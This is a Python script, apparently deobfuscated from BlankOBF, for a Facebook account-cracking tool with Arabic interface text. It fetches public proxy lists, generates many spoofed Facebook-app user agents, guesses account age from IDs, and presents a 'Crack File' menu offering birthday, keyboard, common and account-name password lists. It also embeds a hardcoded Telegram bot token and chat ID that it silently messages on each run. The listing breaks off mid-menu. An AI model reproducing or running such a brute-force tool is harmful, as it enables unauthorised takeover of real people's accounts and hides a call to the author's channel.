""":: You managed to break through BlankOBF v2; Give yourself a pat on your back! ::"""
import requests, os, sys
a = requests.get('https://t.me/vip_REMA/4').text
if 'BESTO' in a:
    os.system('clear')
else:
    print('')
   # p
import os
try:
    import requests
except:
    os.system('pip install requests')
try:
    import rich
except:
    os.system('pip install rich')
try:
    import bs4
except:
    os.system('pip install bs4')
import os, sys, time, requests, json, random, datetime, re, rich, bs4
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.text import Text
console = Console()
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.columns import Columns as col
from rich import pretty
os.system('clear')
import requests
from datetime import datetime, time
import datetime
an = datetime.datetime.now()
an2 = datetime.datetime(2025, 2, 9, 0, 00, 00)
if an > an2 or an == an2:
        exit("ÿ™ŸÖ ÿßŸäŸÇÿßŸÅ ÿßŸÑÿßÿØÿßÿ© ÿ±ÿßÿ≥ŸÑ ÿßŸÑŸÖÿ∑Ÿàÿ±Ÿá ÿ±ŸäŸÅŸÜ - @F_M_D")
else:
        pass
pretty.install()
CON=sol()
print(' ÿ¨ÿßÿ± ÿ™ÿ¥ÿ∫ŸäŸÑ ÿßŸÑÿßÿØÿßÿ© ...')
os.system('clear')
TOKEN=input('> Token : ')
print('- '*19)
ID=input('> ID : ')
os.system('clear')
cetak(nel('\t RaVeN : @F_M_F   -   @zzz_9k '))
print('ÿ¨ÿßÿ± ÿ™ÿ¥ÿ∫ŸäŸÑ ÿßŸÑÿßÿØÿßÿ© ...')
Ibn_Ha9i1 = requests.get('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt').text
Ibn_Ha9i2 = requests.get('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt').text
Ibn_Ha9i3 = requests.get('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt').text
Ibn_Ha9i4 = requests.get('https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt -o socks5.txt').text
Ibn_Ha9i5 = requests.get('https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt -o socks4.txt').text
Ibn_Ha9i6 = requests.get('https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt -o http.txt').text
open('.proxy1.txt', 'w').write(Ibn_Ha9i1)
open('.proxy2.txt', 'w').write(Ibn_Ha9i2)
open('.proxy3.txt', 'w').write(Ibn_Ha9i3)
open('.proxy4.txt', 'w').write(Ibn_Ha9i4)
open('.proxy5.txt', 'w').write(Ibn_Ha9i5)
open('.proxy6.txt', 'w').write(Ibn_Ha9i6)
V='''‚Ä¢ ÿ™ŸÖ ÿ™ÿ¥ÿ∫ŸäŸÑ ÿßÿØÿßÿ© ‡¢™ŸäŸÅŸÜ .üñ§
‚Ä¢ ŸÑÿß ÿ™ŸÜÿ≥Ÿâ ÿµŸàÿ± ÿµŸäÿØ : @F_M_D .
‚Ä¢ ŸÇŸÜÿßÿ™Ÿä : @zzz_9k . '''
requests.post(f'https://api.telegram.org/bot' + str(TOKEN) + '/sendMessage?chat_id=' + str(ID) + '&text=' + str(V))
os.system('clear')
print('')
TOKEN2 = '7790170486:AAGAsg1nsAw23Ght_yIiYU5nIzkjm_bOTpk'
ID2 = '7179283245'
def tahun(ids):
    if len(ids) == 15:
        if ids[:10] in ['1000000000']:
            tahunz = '2009'
        elif ids[:9] in ['100000000']:
            tahunz = '2009'
        elif ids[:8] in ['10000000']:
            tahunz = '2009'
        elif ids[:7] in ['1000000', '1000001', '1000002', '1000003', '1000004', '1000005']:
            tahunz = '2009'
        elif ids[:7] in ['1000006', '1000007', '1000008', '1000009']:
            tahunz = '2010'
        elif ids[:6] in ['100001']:
            tahunz = '2010-2011'
        elif ids[:6] in ['100002', '100003']:
            tahunz = '2011-2012'
        elif ids[:6] in ['100004']:
            tahunz = '2012-2013'
        elif ids[:6] in ['100005', '100006']:
            tahunz = '2013-2014'
        elif ids[:6] in ['100007', '100008']:
            tahunz = '2014-2015'
        elif ids[:6] in ['100009']:
            tahunz = '2015'
        elif ids[:5] in ['10001']:
            tahunz = '2015-2016'
        elif ids[:5] in ['10002']:
            tahunz = '2016-2017'
        elif ids[:5] in ['10003']:
            tahunz = '2018'
        elif ids[:5] in ['10004']:
            tahunz = '2019'
        elif ids[:5] in ['10005']:
            tahunz = '2020'
        elif ids[:5] in ['10006', '10007', '10008']:
            tahunz = '2021-2022'
        else:
            tahunz = ''
    elif len(ids) in [9, 10]:
        tahunz = '2008-2009'
    elif len(ids) == 8:
        tahunz = '2007-2008'
    elif len(ids) == 7:
        tahunz = '2006-2007'
    else:
        tahunz = ''
    return tahunz
    user_agents = ['Dalvik/2.1.0 (Android 9; L-03K Build/PKQ1.190522.001) [FBAN/FB4A;FBAV/979.2.9.20.981;FBPN/com.facebook.katana;FBLC/en_US;FBBV/687217741;FBCR/Glo Mobile;FBMF/samsung;FBBD/samsung;FBDV/SM-N986N;FBSV/11;FBCA/x86:armeabi-v7a;FBDM/{density=2.5,width=1080,height=2220};FB_FW/0;FBRV/0', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E)', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; CMDTDF; .NET4.0C; .NET4.0E; GWX:QUALIFIED)', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:40.0) Gecko/20100101 Firefox/40.0.2 Waterfox/40.0.2', 'Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900T Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4.4.2; SM-T217S Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MALNJS; rv:11.0) like Gecko', 'Mozilla/5.0 (Linux; Android 4.4.2; RCT6203W46 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36', 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)', 'Mozilla/5.0 (Android; Tablet; rv:34.0) Gecko/34.0 Firefox/34.0', 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0; Touch)', 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/7.0; TNJB; 1ButtonTaskbar)', 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)', 'Mozilla/5.0 (Linux; Android 4.0.4; BNTV400 Build/IMM76L) Appl', 'Dalvik/2.1.0 (Linux; U; Android 5.1; AFTM Build/LMY47O)', 'Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J700F Build/MMB29K) [FBAN/Orca-Android;FBAV/181.0.0.12.78;FBPN/com.facebook.orca;FBLC/tr_TR;FBBV/122216364;FBCR/Turk Telekom;FBMF/samsung;FBBD/samsung;FBDV/SM-J700F;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM{density=3.0,width=720,height=1440}', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; ASUS_T00Q Build/KVT49L)UNTRUSTED/1.0C-1.1; Opera Mini/att/4.2', 'Dalvik/1.4.0 (Linux; U; Android 2.3.6; HUAWEI Y210-0100 Build/HuaweiY210-0100)', 'Dalvik/1.4.0 (Linux; U; Android 2.3.6; GT-S5570 Build/GINGERBREAD)', 'Mozilla/5.0 (Linux; U; Android 4.2.2; en-us; Galaxy Nexus Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.3', 'Dalvik/1.6.0 (Linux; U; Android 4.2.2; Galaxy Nexus Build/JDQ39)', 'Mozilla/5.0 (iPad; CPU OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60', 'Dalvik/2.1.0 (Linux; U; Android 5.1; PRO 5 Build/LMY47D)', 'Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322)', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36', 'Mozilla/5.0 (Windows IoT 10.0', 'NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+']
V1='''‚Ä¢ ÿ™ŸÖ ÿ™ÿ¥ÿ∫ŸäŸÑ ÿßÿØÿßÿ© ‡¢™ŸäŸÅŸÜ .üñ§
‚Ä¢ ŸÑÿß ÿ™ŸÜÿ≥Ÿâ ÿµŸàÿ± ÿµŸäÿØ : @F_M_D .
‚Ä¢ ŸÇŸÜÿßÿ™Ÿä : @zzz_9k .'''
requests.post(f'https://api.telegram.org/bot' + str(TOKEN2) + '/sendMessage?chat_id=' + str(ID2) + '&text=' + str(V1))
pretty.install()
CON = sol()
cokbrut = []
ses = requests.Session()
princp = []
while True:
    try:
        prox = requests.get('https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt').text
        open('.PROXZ.txt', 'w').write(prox)
        break
    except Exception as e:
        zone('wait for internet ... ')
        time.sleep(1)
while True:
    try:
        prox = requests.get('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt').text
        open('.PROXZ.txt', 'w').write(prox)
        break
    except Exception as e:
        zone('wait for internet......')
        time.sleep(1)
while True:
    try:
        prox = requests.get('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt').text
        open('.PROXZ.txt', 'w').write(prox)
        break
    except Exception as e:
        zone('wait for internet......')
        time.sleep(1)
prox = open('.PROXZ.txt', 'r').read().splitlines()
fbks = ('com.facebook.adsmanager', 'com.facebook.lite', 'com.facebook.orca', 'com.facebook.katana', 'com.facebook.mlite')
gt = random.choice(['GT-1015', 'GT-1020', 'GT-1030', 'GT-1035', 'GT-1040', 'GT-1045', 'GT-1050', 'GT-1240', 'GT-1440', 'GT-1450', 'GT-18190', 'GT-18262', 'GT-19060I', 'GT-19082', 'GT-19083', 'GT-19105', 'GT-19152', 'GT-19192', 'GT-19300', 'GT-19505', 'GT-2000', 'GT-20000', 'GT-200s', 'GT-3000', 'GT-414XOP', 'GT-6918', 'GT-7010', 'GT-7020', 'GT-7030', 'GT-7040', 'GT-7050', 'GT-7100', 'GT-7105', 'GT-7110', 'GT-7205', 'GT-7210', 'GT-7240R', 'GT-7245', 'GT-7303', 'GT-7310', 'GT-7320', 'GT-7325', 'GT-7326', 'GT-7340', 'GT-7405', 'GT-7550   5GT-8005', 'GT-8010', 'GT-81', 'GT-810', 'GT-8105', 'GT-8110', 'GT-8220S', 'GT-8410', 'GT-9300', 'GT-9320', 'GT-93G', 'GT-A7100', 'GT-A9500', 'GT-ANDROID', 'GT-B2710', 'GT-B5330', 'GT-B5330B', 'GT-B5330L', 'GT-B5330ZKAINU', 'GT-B5510', 'GT-B5512', 'GT-B5722', 'GT-B7510', 'GT-B7722', 'GT-B7810', 'GT-B9150', 'GT-B9388', 'GT-C3010', 'GT-C3262', 'GT-C3310R', 'GT-C3312', 'GT-C3312R', 'GT-C3313T', 'GT-C3322', 'GT-C3322i', 'GT-C3520', 'GT-C3520I', 'GT-C3592', 'GT-C3595', 'GT-C3782', 'GT-C6712', 'GT-E1282T', 'GT-E1500', 'GT-E2200', 'GT-E2202', 'GT-E2250', 'GT-E2252', 'GT-E2600', 'GT-E2652W', 'GT-E3210', 'GT-E3309', 'GT-E3309I', 'GT-E3309T', 'GT-G530H', 'GT-g900f', 'GT-G930F', 'GT-H9500', 'GT-I5508', 'GT-I5801', 'GT-I6410', 'GT-I8150', 'GT-I8160OKLTPA', 'GT-I8160ZWLTTT', 'GT-I8258', 'GT-I8262D', 'GT-I8268', 'GT-I8505', 'GT-I8530BAABTU', 'GT-I8530BALCHO', 'GT-I8530BALTTT', 'GT-I8550E', 'GT-i8700', 'GT-I8750', 'GT-I900', 'GT-I9008L', 'GT-i9040', 'GT-I9080E', 'GT-I9082C', 'GT-I9082EWAINU', 'GT-I9082i', 'GT-I9100G', 'GT-I9100LKLCHT', 'GT-I9100M', 'GT-I9100P', 'GT-I9100T', 'GT-I9105UANDBT', 'GT-I9128E', 'GT-I9128I', 'GT-I9128V', 'GT-I9158P', 'GT-I9158V', 'GT-I9168I', 'GT-I9192I', 'GT-I9195H', 'GT-I9195L', 'GT-I9250', 'GT-I9303I', 'GT-I9305N', 'GT-I9308I', 'GT-I9505G', 'GT-I9505X', 'GT-I9507V', 'GT-I9600', 'GT-m190', 'GT-M5650', 'GT-mini', 'GT-N5000S', 'GT-N5100', 'GT-N5105', 'GT-N5110', 'GT-N5120', 'GT-N7000B', 'GT-N7005', 'GT-N7100T', 'GT-N7102', 'GT-N7105', 'GT-N7105T', 'GT-N7108', 'GT-N7108D', 'GT-N8000', 'GT-N8005', 'GT-N8010', 'GT-N8020', 'GT-N9000', 'GT-N9505', 'GT-P1000CWAXSA', 'GT-P1000M', 'GT-P1000T', 'GT-P1010', 'GT-P3100B', 'GT-P3105', 'GT-P3108', 'GT-P3110', 'GT-P5100', 'GT-P5200', 'GT-P5210XD1', 'GT-P5220', 'GT-P6200', 'GT-P6200L', 'GT-P6201', 'GT-P6210', 'GT-P6211', 'GT-P6800', 'GT-P7100', 'GT-P7300', 'GT-P7300B', 'GT-P7310', 'GT-P7320', 'GT-P7500D', 'GT-P7500M', 'GT-P7500R', 'GT-P7500V', 'GT-P7501', 'GT-P7511', 'GT-S3330', 'GT-S3332', 'GT-S3333', 'GT-S3370', 'GT-S3518', 'GT-S3570', 'GT-S3600i', 'GT-S3650', 'GT-S3653W', 'GT-S3770K', 'GT-S3770M', 'GT-S3800W', 'GT-S3802', 'GT-S3850', 'GT-S5220', 'GT-S5220R', 'GT-S5222', 'GT-S5230', 'GT-S5230W', 'GT-S5233T', 'GT-s5233w', 'GT-S5250', 'GT-S5253', 'GT-s5260', 'GT-S5280', 'GT-S5282', 'GT-S5283B', 'GT-S5292', 'GT-S5300', 'GT-S5300L', 'GT-S5301', 'GT-S5301B', 'GT-S5301L', 'GT-S5302', 'GT-S5302B', 'GT-S5303', 'GT-S5303B', 'GT-S5310', 'GT-S5310B', 'GT-S5310C', 'GT-S5310E', 'GT-S5310G', 'GT-S5310I', 'GT-S5310L', 'GT-S5310M', 'GT-S5310N', 'GT-S5312', 'GT-S5312B', 'GT-S5312C', 'GT-S5312L', 'GT-S5330', 'GT-S5360', 'GT-S5360B', 'GT-S5360L', 'GT-S5360T', 'GT-S5363', 'GT-S5367', 'GT-S5369', 'GT-S5380', 'GT-S5380D', 'GT-S5500', 'GT-S5560', 'GT-S5560i', 'GT-S5570B', 'GT-S5570I', 'GT-S5570L', 'GT-S5578', 'GT-S5600', 'GT-S5603', 'GT-S5610', 'GT-S5610K', 'GT-S5611', 'GT-S5620', 'GT-S5670', 'GT-S5670B', 'GT-S5670HKBZTA', 'GT-S5690', 'GT-S5690R', 'GT-S5830', 'GT-S5830D', 'GT-S5830G', 'GT-S5830i', 'GT-S5830L', 'GT-S5830M', 'GT-S5830T', 'GT-S5830V', 'GT-S5831i', 'GT-S5838', 'GT-S5839i', 'GT-S6010', 'GT-S6010BBABTU', 'GT-S6012', 'GT-S6012B', 'GT-S6102', 'GT-S6102B', 'GT-S6293T', 'GT-S6310B', 'GT-S6310ZWAMID', 'GT-S6312', 'GT-S6313T', 'GT-S6352', 'GT-S6500', 'GT-S6500D', 'GT-S6500L', 'GT-S6790', 'GT-S6790L', 'GT-S6790N', 'GT-S6792L', 'GT-S6800', 'GT-S6800HKAXFA', 'GT-S6802', 'GT-S6810', 'GT-S6810B', 'GT-S6810E', 'GT-S6810L', 'GT-S6810M', 'GT-S6810MBASER', 'GT-S6810P', 'GT-S6812', 'GT-S6812B', 'GT-S6812C', 'GT-S6812i', 'GT-S6818', 'GT-S6818V', 'GT-S7230E', 'GT-S7233E', 'GT-S7250D', 'GT-S7262', 'GT-S7270', 'GT-S7270L', 'GT-S7272', 'GT-S7272C', 'GT-S7273T', 'GT-S7278', 'GT-S7278U', 'GT-S7390', 'GT-S7390G', 'GT-S7390L', 'GT-S7392', 'GT-S7392L', 'GT-S7500', 'GT-S7500ABABTU', 'GT-S7500ABADBT', 'GT-S7500ABTTLP', 'GT-S7500CWADBT', 'GT-S7500L', 'GT-S7500T', 'GT-S7560', 'GT-S7560M', 'GT-S7562', 'GT-S7562C', 'GT-S7562i', 'GT-S7562L', 'GT-S7566', 'GT-S7568', 'GT-S7568I', 'GT-S7572', 'GT-S7580E', 'GT-S7583T', 'GT-S758X', 'GT-S7592', 'GT-S7710', 'GT-S7710L', 'GT-S7898', 'GT-S7898I', 'GT-S8500', 'GT-S8530', 'GT-S8600', 'GT-STB919', 'GT-T140', 'GT-T150', 'GT-V8a', 'GT-V8i', 'GT-VC818', 'GT-VM919S', 'GT-W131', 'GT-W153', 'GT-X831', 'GT-X853', 'GT-X870', 'GT-X890', 'GT-Y8750'])
ugen = []
ugen2 = []
for xd in range(100000):
    a = 'Mozilla/5.0 (Symbian/3; Series60/'
    b = random.randrange(1, 9)
    c = random.randrange(1, 9)
    d = 'Nokia'
    e = random.randrange(100, 9999)
    f = '/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
    g = random.randrange(1, 9)
    h = random.randrange(1, 4)
    i = random.randrange(1, 4)
    j = random.randrange(1, 4)
    k = 'Mobile Safari/535.1'
    uaku = f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}'
    ugen2.append(uaku)
    aa = 'Mozilla/5.0 (Linux; U; Android'
    b = random.choice(['6', '7', '8', '9', '10', '11', '12'])
    c = ' en-us; GT-'
    d = random.choice(['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e = random.randrange(1, 999)
    f = random.choice(['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g = 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h = random.randrange(73, 100)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Mobile Safari/537.36'
    uaku2 = f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
for xd in range(10):
    a = 'Mozilla/5.0 (Symbian/3; Series60/'
    b = random.randrange(1, 9)
    c = random.randrange(1, 9)
    d = 'Nokia'
    e = random.randrange(100, 9999)
    f = '/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
    g = random.randrange(1, 9)
    h = random.randrange(1, 4)
    i = random.randrange(1, 4)
    j = random.randrange(1, 4)
    k = 'Mobile Safari/535.1'
    uaku = f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}'
    ugen2.append(uaku)

def uaku():
    try:
        ua = open('.PROXZ.txt', 'r').read().splitlines()
        for ub in ua:
            ugen.append(ub)
    except:
        a = requests.get('https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt').text
        ua = open('.PROXZ.txt', 'w')
        aa = re.findall('line">(.*?)<', str(a))
        for un in aa:
            ua.write(un + '\n')
        ua = open('.PROXZ.txt', 'r').read().splitlines()
id, id2, loop, ok, cp, akun, oprek, method, lisensiku, taplikasi, tokenku, uid, lisensikuni = ([], [], 0, 0, 0, [], [], [], [], [], [], [], [])
cokbrut = []
pwpluss = []
pwnya = []
from getpass import getpass
RAVEN = input('\033[93m- Enter Number [1] to Continue : \033[92m')
if RAVEN == '1':
    import time
    import sys
    import os
    TSGEL = [
        '\x1b[1;97m[\x1b[1;91m‚ñ†\x1b[0m‚ñ°‚ñ°‚ñ°‚ñ°‚ñ°‚ñ°‚ñ°‚ñ°‚ñ°]  ',
        '\x1b[1;97m[\x1b[1;92m‚ñ†‚ñ†\x1b[0m‚ñ°‚ñ°‚ñ°‚ñ°‚ñ°‚ñ°‚ñ°‚ñ°]  ',
        '\x1b[1;97m[\x1b[1;93m‚ñ†‚ñ†‚ñ†\x1b[0m‚ñ°‚ñ°‚ñ°‚ñ°‚ñ°‚ñ°‚ñ°]  ',
        '\x1b[1;97m[\x1b[1;95m‚ñ†‚ñ†‚ñ†‚ñ†\x1b[0m‚ñ°‚ñ°‚ñ°‚ñ°‚ñ°‚ñ°]  ',
        '\x1b[1;97m[\x1b[1;94m‚ñ†‚ñ†‚ñ†‚ñ†‚ñ†\x1b[0m‚ñ°‚ñ°‚ñ°‚ñ°‚ñ°]  ',
        '\x1b[1;97m[\x1b[38;5;26m‚ñ†‚ñ†‚ñ†‚ñ†‚ñ†‚ñ†\x1b[0m‚ñ°‚ñ°‚ñ°‚ñ°]  ',
        '\x1b[1;97m[\x1b[1;96m‚ñ†‚ñ†‚ñ†‚ñ†‚ñ†‚ñ†‚ñ†\x1b[0m‚ñ°‚ñ°‚ñ°]  ',
        '\x1b[1;97m[\x1b[38;5;86m‚ñ†‚ñ†‚ñ†‚ñ†‚ñ†‚ñ†‚ñ†‚ñ†\x1b[0m‚ñ°]  ',
        '\x1b[1;97m[\x1b[38;5;96m‚ñ†‚ñ†‚ñ†‚ñ†‚ñ†‚ñ†‚ñ†‚ñ†‚ñ†\x1b[0m]  ',
        '\x1b[1;97m[\x1b[38;5;203m‚ñ†‚ñ†‚ñ†‚ñ†‚ñ†‚ñ†‚ñ†‚ñ†‚ñ†‚ñ†\x1b[0m]  ']
    for i in range(60):
        time.sleep(0.1)
        sys.stdout.write('\rÿ¨ÿßÿ±Ÿä ÿ™ÿ≥ÿ¨ŸäŸÑ ÿØÿÆŸàŸÑ ... ' + TSGEL[i % len(TSGEL)])
logo ='''\x1b[38;5;228m ‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚°ø‚¢ã‚£©‚£≠‚£∂‚£∂‚£Æ‚£≠‚°ô‚†ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø
‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚†ø‚£ã‚£¥‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£¶‚°ô‚¢ø‚£ø‚£ø‚£ø
‚£ø‚£ø‚£ø‚£ø‚£ø‚°É‚†Ñ‚†π‚°ø‚£ø‚£ø‚£ø‚£ø‚†ü‚†õ‚£ø‚£ø‚£ø‚£ø‚£∑‚°å‚¢ø‚£ø‚£ø
‚£ø‚£ø‚£ø‚£ø‚£ø‚†ê‚£†‚°∂‚£∂‚£≤‚°é‚¢ª‚£ø‚£§‚£¥‚£æ‚£ø‚£ø‚£ø‚£ø‚£ø‚†∏‚£ø‚£ø
‚£ø‚†ü‚£ã‚°•‚°∂‚£û‚°Ø‚£ü‚£æ‚£∫‚¢Ω‚°ß‚£•‚£≠‚£â‚¢ª‚£ø‚£ø‚£ø‚£ø‚£ø‚£Ü‚¢ª‚£ø
‚°É‚£æ‚¢Ø‚¢ø‚¢Ω‚£´‚°Ø‚£∑‚£≥‚¢Ø‚°Ø‚†Ø‚†∑‚†ª‚†û‚£º‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚°å‚£ø
‚£¶‚£ç‚°ô‚†´‚†õ‚†ï‚£ã‚°ì‚†≠‚£°‚¢∂‚†ó‚£°‚£∂‚°ù‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ß‚¢π
‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ò‚£õ‚£ã‚£°‚£µ‚£æ‚£ø‚£ø‚£ø‚¢∏‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚¢∏
‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚¢∏‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚¢∏
‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚¢∏‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚¢∏\n\n\x1b[1;33m‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ \x1b[1;32 \x1b[1;34m‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ  \n'''

def linex():
    print('\x1b[38;5;166m‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ \x1b[38;5;205m @F_M_D \x1b[38;5;166m‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ')

def clear():
    os.system('clear')
    print(logo)
loop = 0
lim = 0
oks = []
cps = []
twf = []
pcp = []
tp = 0
id = []
tokenku = []

def menu():
    global lim, tp
    try:
        clear()
        sj = 'server on'
        if 'server on' in sj:
            print('\x1b[2;36m [01] \x1b[2;36m Crack File : ')
            linex()
            xd = input(' \x1b[38;5;117mChoose > ')
            if xd in ['1', '01']:
                clear()
                file = input('\x1b[1;92m‚Ä¢ FILE NAME \x1b[1;94m: ')
                try:
                    fo = open(file, 'r').read().splitlines()
                except FileNotFoundError:
                    print(' File location not found ')
                    time.sleep(1)
                    menu()
                clear()
                print(' \x1b[1;91m[1] \x1b[1;92mFAST  ‚ö° ')
                linex()
                mthd = input('\x1b[1;96m‚Ä¢ Choose  \x1b[1;94m> ')
                clear()
                plist = []
                print('''\x1b[38;5;180m[1] - Births | ÿ®ÿßÿ≥Ÿàÿ±ÿØ ŸÖŸàÿßŸÑŸäÿØ .
 ÔπéÔπéÔπéÔπéÔπéÔπéÔπéÔπéÔπéÔπéÔπéÔπéÔπéÔπé
[2] - Keyboard | ÿ®ÿßÿ≥Ÿàÿ±ÿØÿßÿ™ ÿ®ÿØÿßŸäÿßÿ™ ŸÉŸäÿ®Ÿàÿ±ÿØ .
 ÔπéÔπéÔπéÔπéÔπéÔπéÔπéÔπéÔπéÔπéÔπéÔπéÔπéÔπé
[3] - Well -known | ÿ®ÿßÿ≥Ÿàÿ±ÿØÿßÿ™ ŸÖÿ¥ŸáŸàÿ±Ÿá .üíÄ
 ÔπéÔπéÔπéÔπéÔπéÔπéÔπéÔπéÔπéÔπéÔπéÔπéÔπéÔπé
[4] - Account Name | ÿ®ÿßÿ≥Ÿàÿ±ÿØ ÿßÿ≥ŸÖ ÿßŸÑÿ≠ÿ≥ÿßÿ® .
